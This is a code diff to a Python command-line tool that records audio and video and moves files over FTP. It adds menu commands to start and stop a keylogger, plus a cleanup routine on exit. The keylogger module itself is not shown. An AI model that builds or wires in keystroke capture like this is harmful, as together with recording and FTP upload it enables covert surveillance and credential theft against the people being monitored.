@@ -3,6 +3,7 @@ import sys
 from enum import Enum
 from rich import print
 import audio_utils
+import keylogger
 import misc_utils
 import ftp_utils
 import video_utils
@@ -28,8 +29,23 @@ class Command(Enum):
   SPEAK_TEXT = 'speak_text'
   UPLOAD_FTP = 'upload_ftp'
   DOWNLOAD_FTP = 'download_ftp'
+  START_KEYLOGGER = 'start_kl'
+  STOP_KEYLOGGER = 'stop_kl'
   HELP = 'help'
   EXIT = 'exit'
+
+def end_avmisc():
+  """Properly handles the closing of the application.
+
+  Stops all running subprocesses and threads.
+  """
+  audio_utils.stop_playing_audio()
+  audio_utils.stop_recording_audio()
+  video_utils.stop_recording_video()
+  keylogger.stop_keylogger()
+  sys.exit()
+
+
 
 COMMANDS = {
     Command.LIST_DEFAULT_AUDIO_DEVICES: {
@@ -96,9 +112,17 @@ COMMANDS = {
         'description': 'Download a file from an FTP server.',
         'method': ftp_utils.download
     },
+    Command.START_KEYLOGGER: {
+        'description': 'Start the keylogger.',
+        'method': keylogger.start_keylogger
+    },
+    Command.STOP_KEYLOGGER: {
+        'description': 'Stop the keylogger.',
+        'method': keylogger.stop_keylogger
+    },
     Command.EXIT: {
         'description': 'Exit the program.',
-        'method': sys.exit
+        'method': end_avmisc
     },
     Command.HELP: {
         'description': 'Show this help message.',
@@ -138,7 +162,7 @@ def begin() -> None:
       else:
         process_command(command)
     except KeyboardInterrupt:
-      sys.exit()
+      end_avmisc()
     except ValueError as err:
       print(err)
     except InvalidCommandError:
